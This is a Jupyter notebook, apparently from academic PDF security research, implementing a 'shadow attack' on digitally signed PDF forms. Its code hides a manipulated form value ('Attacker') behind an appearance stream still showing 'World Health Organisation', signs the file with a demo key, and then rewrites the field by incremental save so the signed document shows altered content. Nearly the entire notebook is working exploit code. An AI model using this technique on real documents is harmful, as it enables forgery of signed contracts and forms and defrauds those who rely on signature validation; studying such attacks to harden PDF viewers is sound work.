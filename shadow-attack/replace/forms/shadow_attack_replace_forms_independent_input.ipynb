{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 0: Configuration Parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "folder_path                     = \"/media/sf_vladi/Dokumente/git/research/pdf_security/tools/shadow-attacker/pdfs/replace-forms/\"\n",
    "signer_path                     =\"./pdf-signer/\"\n",
    "input_file                      =\"form.pdf\"\n",
    "shadowed_file                   =\"form-shadowed.pdf\"\n",
    "shadowed_file_signed            =\"form-shadowed-signed.pdf\"\n",
    "shadowed_file_signed_manipulated=\"form-shadowed-signed-manipulated.pdf\"\n",
    "formText2Manipulation           = \"Attacker\"\n",
    "formText2Replace                = \"World Health Organisation\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step 1: Generating shadow document\n",
    "The following script finds the form field which will be shadowed by searching its value (*formText2Replace*).\n",
    "On the presentation level, the new document (*shadowed_file*) does not differ from the previous one (*input_file*)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import types\n",
    "import os\n",
    "import io\n",
    "import re\n",
    "import mmap\n",
    "from random import choice\n",
    "from string import ascii_lowercase\n",
    "import PyPDF4 as pyPDF\n",
    "from PyPDF4 import utils\n",
    "from PyPDF4.generic import *\n",
    "from PyPDF4.utils import *\n",
    "from PyPDF4.pdf import *\n",
    "import fitz\n",
    "import shutil\n",
    "\n",
    "pdf_reader = pyPDF.PdfFileReader(open(folder_path+input_file, mode=\"rb\"))\n",
    "list(pdf_reader.pages) # Process all the objects.\n",
    "pdf_writer = pyPDF.PdfFileWriter()\n",
    "\n",
    "def set_need_appearances_writer(writer: PdfFileWriter):\n",
    "    try:\n",
    "        catalog = writer._root_object\n",
    "        # get the AcroForm tree\n",
    "        if \"/AcroForm\" not in catalog:\n",
    "            writer._root_object.update({\n",
    "                NameObject(\"/AcroForm\"): IndirectObject(len(writer._objects), 0, writer)})\n",
    "\n",
    "        need_appearances = NameObject(\"/NeedAppearances\")\n",
    "        writer._root_object[\"/AcroForm\"][need_appearances] = BooleanObject(True)\n",
    "        return writer\n",
    "\n",
    "    except Exception as e:\n",
    "        print('set_need_appearances_writer() catch : ', repr(e))\n",
    "        return writer\n",
    "\n",
    "def update_field_values(writer: PdfFileWriter):\n",
    "    fields = pdf_reader.getFields()\n",
    "    changed_form_name = \"\"\n",
    "    for key,val in fields.items():\n",
    "        field = DictionaryObject(val)\n",
    "\n",
    "        for key2, val2 in field.items():\n",
    "            if val2 == formText2Replace:\n",
    "                changed_form_name = field[\"/T\"]\n",
    "                field_dictionary = {key:formText2Manipulation}\n",
    "                writer.updatePageFormFieldValues(writer.getPage(0),field_dictionary)\n",
    "                try:\n",
    "                    appearance = field.get('/AP').getObject().get('/N').getObject()\n",
    "                    shadowed = appearance.getData().replace(bytes(formText2Manipulation,\"ascii\"), bytes(formText2Replace,\"ascii\"))\n",
    "                    streamAP = DecodedStreamObject()\n",
    "                    for key, val in appearance.items():\n",
    "                        if key == \"/Filter\" or key == \"/Length\":\n",
    "                            pass\n",
    "                        else:\n",
    "                            streamAP.update({key:val})\n",
    "                    streamAP.setData(shadowed)\n",
    "                    writer._addObject(streamAP)\n",
    "                    field.get('/AP').getObject().update({\"/N\":streamAP})\n",
    "                except:\n",
    "                    pass\n",
    "    return changed_form_name, writer\n",
    "\n",
    "for pageNum in range(pdf_reader.numPages):\n",
    "    pageObj = pdf_reader.getPage(pageNum)\n",
    "    pdf_writer.addPage(pdf_reader.getPage(pageNum))\n",
    "    changed_form_name, pdf_writer = update_field_values(pdf_writer)\n",
    "\n",
    "with open(folder_path+shadowed_file, \"wb\") as filehandle_output:\n",
    "    pdf_writer.write(filehandle_output)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "0"
     },
     "metadata": {},
     "execution_count": 3
    }
   ],
   "source": [
    "os.system('java -jar '+signer_path+'pdfsigner.jar -i '+folder_path+shadowed_file+' -o '+folder_path+shadowed_file_signed+' -pkcs '+signer_path+'demo-rsa2048.p12 -password demo-rsa2048 -sigtype approval -sigview visible -sigimg '+signer_path+'PdfInsecurityTeam-Logo.png')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "Text2\n"
    }
   ],
   "source": [
    "shutil.copyfile(folder_path+shadowed_file_signed, folder_path+shadowed_file_signed_manipulated)\n",
    "\n",
    "doc = fitz.open(folder_path+shadowed_file_signed_manipulated)\n",
    "for page in doc:\n",
    "    for field in page.widgets():\n",
    "        if field.field_name == changed_form_name:\n",
    "            field.field_value = formText2Manipulation   \n",
    "            field.update()\n",
    "doc.saveIncr()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python36964bitaab9f7a02a1344ffbf068f3bf2812102",
   "display_name": "Python 3.6.9 64-bit"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}